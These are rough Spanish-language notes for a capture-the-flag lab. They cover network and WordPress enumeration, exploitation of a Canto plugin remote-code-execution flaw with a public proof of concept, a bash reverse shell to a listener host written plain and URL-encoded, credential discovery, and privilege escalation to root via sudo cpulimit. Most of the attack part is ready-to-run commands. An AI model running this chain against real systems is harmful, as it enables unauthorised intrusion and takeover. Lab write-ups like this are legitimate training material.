
Crear los directorios

mkdir -p ctf/canto/reconocimiento

Descubriendo equipos en la red

sudo arp-scan -I eth0 -l > ctf/canto/reconocimiento/rep_scan01.txt

Descubriendo los servicios

sudo nmap -p- -sS -T4 -vvv -sV 192.168.196.5 -oN ctf/canto/reconocimiento/rep_nmap01.txt

Mostrar características del servidor web

whatweb http:// 192.168.196.5 > ctf/canto/reconocimiento/rep_web01.txt

searchsploit wordpress | grep –i “zoner”

Utilizar el navegador para ver el servicio web

Enumeración de directorios (Metodología Fuzzing)

sudo gobuster dir -u htpp://192.168.196.5 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o canto/report/rep_gobuster01.txt

ffuf -u http://ejemplo.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/common.txt

Revisar los directorios

Se muestra una página en blanco, significa que existe el recurso, pero, no se tiene los permisos.

Veamos la estructura de Wordpress en git hub

Carpetas Principales en la raíz de WordPress

            wp-admin

            wp-content

            wp-includes

Archivos principales en la raíz de WordPress:

        wp-config.php

        wp-login.php

Principales subcarpetas de WordPress

            Plugins

            Themes

            Uploads

Busquemos los plugin que utiliza la página

Buscar un wordlist de plugin para wordpress en github

Descargar el worlist del github

git clone https://github.com/Perfectdotexe/WordPress-Plugins-List

Enumeración de los plugins

sudo gobuster dir -u htpp://192.168.192.100/wp-content -w canto/tools/plugins.txt -o canto/report/rep_gobuster02.txt

Encontramos 2 plugins

canto y akismet

Veamos la descripción de los plugins

http://192.168.196.5/wp-content/plugins/canto/readme.txt

Encontramos la siguiente vulnerabilidad

CVE-2023-3452-PoC - Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) - Remote Code Execution (RCE) – Unauthenticated

git clone https://github.com/leoanggal1/CVE-2023-3452-PoC

Ejecutemos el script

python3 CVE-2023-3452.py -u http://192.168.196.5 -LHOST 192.168.196.3 -c 'id'

Tenemos la capacidad de ejecución remota de código, entonces realizar una Shell inverso

En la página:

https://www.urlencoder.org/es/

Escribir

bash -c "bash -i >& /dev/tcp/192.168.192.222/4242 0>&1"

Codifica los datos:

Utilizar el comando nc para leer los datos de la red.

nc -nlvp 4242

Ejecutamos el scrip:

python3 CVE-2023-3452.py -u http://192.168.192.100 -LHOST 192.168.192.222 -c 'bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.192.222%2F4242%200%3E%261%22'


----

Primero en una terminal
```sh
nc -nlvp 4444
```

En otra terminal
```

```

Llegamos a acceder al servidor

Probar algunos comandos de Linux

ls, pwd, hostname, id

Listar el home

ls /home

cat /etc/passwd

Ingresar a la página y verificar con el usuario erik

http://IP/wp-login.php

ver los permisos a la carpeta de erik

ls -al /home

Ver a que grupo pertenece

id

Ingresar a la carpeta notes

cd /home/erik/notes

leer el archivo Day2

cat Day2.txt

find / -name backups 2>/dev/null

Hay un directorio con ese nombre, ingrese.

cd /var/wordpress/backups

leer el archive 12052024.txt

cat 12052024.txt

Es el password de erik, ingresar a la página, hay un servicio ssh

conectarse con ssh

ssh erik@192.168.192.100

**Escalando privilegios**

sudo -l

El usuario erik, puede ejecutar cpulimit sin proporcionar contraseña el binario se encuentra en /usr/bin/cpulimit

ls -la /usr/bin/cpulimit

Ingresar a la página GTFOBins

sudo /usr/bin/cpulimit -l 100 -f /bin/sh

Ingresaste como root

cd /

ls -la

cd /root

ls –la

´

Mostrar conexiones activas, procesos y puertos abiertos con Netstat

netstat -putona

·        p Muestra las conexiones para el protocolo especificado que puede ser TCP o UDP

·        u Lista todos los puertos UDP

·        t  Lista todos los puertos TCP

·        o Muestra los timers

·        n Muestra el número de puerto

·        a Para visualizar todas las conexiones activas del sistema

netstat -putona |grep ':6881'

Crear usuario ssh

https://www.factoriadigital.com/como-crear-un-usuario-para-acceder-mediante-ssh/#:~:text=Para%20crear%20un%20nuevo%20usuario,del%20usuario%20que%20deseas%20crear.&text=Sigue%20las%20instrucciones%20para%20establecer,en%20blanco%20si%20lo%20deseas).